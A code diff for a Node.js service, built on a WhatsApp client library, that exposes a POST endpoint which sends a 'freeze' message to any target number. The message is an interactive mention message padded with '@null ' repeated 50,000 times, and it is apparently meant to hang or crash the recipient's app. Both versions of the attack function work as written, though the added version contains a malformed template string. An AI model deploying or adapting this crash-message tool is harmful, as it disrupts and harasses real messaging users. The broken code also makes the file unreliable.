@@ -1,20 +1,15 @@
-const { WAConnection, MessageType } = require("baileys");
+const { WAConnection, MessageType } = require('@adiwajshing/baileys');
 const fs = require('fs');
-const express = require('express');
-
-const app = express();
-const PORT = process.env.PORT || '3000';
-const SESSION_FILE_PATH = './session/Creds.json';
+const express = require('express')
+const SESSION_FILE_PATH = './session/,Creds.json';
 let conn = new WAConnection();
-
-app.use(express.json()); // Middleware to parse JSON bodies
 
 async function connectToWhatsApp() {
     if (fs.existsSync(SESSION_FILE_PATH)) {
-        conn = await WAConnection.fromJSON(JSON.parse(fs.readFileSync(SESSION_FILE_PATH)));
         conn.loadAuthInfo(SESSION_FILE_PATH);
     }
 
+    // Connect to WhatsApp
     await conn.connect({ timeoutMs: 30 * 1000 });
     fs.writeFileSync(SESSION_FILE_PATH, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'));
 
@@ -23,7 +18,7 @@ async function connectToWhatsApp() {
 
 // Function to send a freeze message
 async function freezekamoflase(target) {
-    await conn.relayMessage(target, {
+    const message = {
         groupMentionedMessage: {
             message: {
                 interactiveMessage: {
@@ -35,7 +30,7 @@ async function freezekamoflase(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: `𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐕2 🏴‍☠️ ${"@null ".repeat(50000)}`,
+                        text: 𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐕2 🏴‍☠️ ${"@null ".repeat(50000)},
                         contextInfo: { mentionedJid: ["null@s.whatsapp.net"] }
                     },
                     nativeFlowMessage: {},
@@ -46,28 +41,32 @@ async function freezekamoflase(target) {
                 }
             }
         }
-    }, { participant: { jid: target } }, { messageId: null });
+    };
+
+    await conn.relayMessage(target, message, { participant: target });
 }
 
 // API endpoint for freezekamoflase
-app.post('/freezekamoflase', async (req, res) => {
-    const { target } = req.body; // Expecting JSON with target
+module.exports = async (req, res) => {
+    if (req.method === 'POST') {
+        const { target } = req.body; // Expecting JSON with target
 
-    if (!target) {
-        return res.status(400).send('Target is required');
+        if (!target) {
+            return res.status(400).send('Target is required');
+        }
+
+        try {
+            await freezekamoflase(target);
+            res.send(`Freeze message sent to ${target}`);
+        } catch (error) {
+            console.error(error);
+            res.status(500).send('An error occurred while sending the freeze message');
+        }
+    } else {
+        res.setHeader('Allow', ['POST']);
+        res.status(405).end(`Method ${req.method} Not Allowed`);
     }
+};
 
-    try {
-        await freezekamoflase(target);
-        res.send(`Freeze message sent to ${target}`);
-    } catch (error) {
-        console.error(error);
-        res.status(500).send('An error occurred while sending the freeze message');
-    }
-});
-
-// Start the server and connect to WhatsApp
-app.listen(PORT, () => {
-    console.log(`Server is running on http://localhost:${PORT}`);
-    connectToWhatsApp();
-});
+// Start the connection to WhatsApp
+connectToWhatsApp();
